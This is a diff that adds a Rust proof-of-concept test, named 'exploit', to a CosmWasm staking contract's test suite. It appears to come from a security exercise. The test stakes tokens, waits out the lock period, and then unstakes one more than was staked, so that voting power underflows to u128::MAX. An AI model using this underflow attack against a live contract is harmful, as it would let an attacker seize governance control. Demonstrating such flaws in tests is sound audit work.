@@ -151,4 +151,78 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, amount);
     }
+    
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        let amount = Uint128::new(1_000);
+
+        app = mint_tokens(app, USER.to_string(), amount);
+        let sender = Addr::unchecked(USER);
+
+        // deposit funds
+        let msg = ExecuteMsg::Deposit {};
+        app.execute_contract(
+            sender.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(amount.u128(), DENOM)],
+        )
+        .unwrap();
+
+        // no funds left
+        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        assert_eq!(balance, Uint128::zero());
+
+        // query user
+        let msg = QueryMsg::GetUser {
+            user: (&USER).to_string(),
+        };
+        let user: UserInfo = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(user.total_tokens, amount);
+
+        // normal stake
+        let msg = ExecuteMsg::Stake {
+            lock_amount: amount.u128(),
+        };
+        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // query voting power
+        let msg = QueryMsg::GetVotingPower {
+            user: (&USER).to_string(),
+        };
+        let voting_power: u128 = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(voting_power, amount.u128());
+
+        // fast forward time
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // evil unstake
+        let msg = ExecuteMsg::Unstake {
+            // -1 should give us u128::MAX voting_power
+            unlock_amount: amount.u128() + 1,
+        };
+        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // hella voting power
+        let msg = QueryMsg::GetVotingPower {
+            user: (&USER).to_string(),
+        };
+        let voting_power: u128 = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(voting_power, u128::MAX);
+    }
 }
